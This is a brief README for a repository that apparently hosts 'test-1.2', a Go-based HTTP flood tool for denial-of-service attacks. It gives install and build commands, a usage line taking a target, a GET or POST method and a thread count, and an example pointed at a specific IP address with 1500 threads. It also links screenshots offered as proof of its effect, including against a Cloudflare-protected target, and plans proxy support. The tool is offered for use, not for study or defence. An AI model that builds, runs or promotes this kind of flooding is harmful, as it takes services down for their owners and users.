# test-1.2
Just simple httpflood

TODO:
Remove shity-code 
Add proxy

## Install
```sh
sudo apt install golang-go
git clone https://github.com/iaxoicmnfc/test-1.2.git
cd test-1.2
go mod init http 
go get github.com/valyala/fasthttp
go build 
```
## Usage 
```sh
./http <target> <GET/POST> <threads>
example: ./http http://51.159.30.249 POST 1500
```

## Power-proof
### Non-Protect
![alt-text](https://i.imgur.com/2WQ4jk6.png)
### Cloudflare-Low 
![alt-text](https://i.imgur.com/8bxScW1.png)
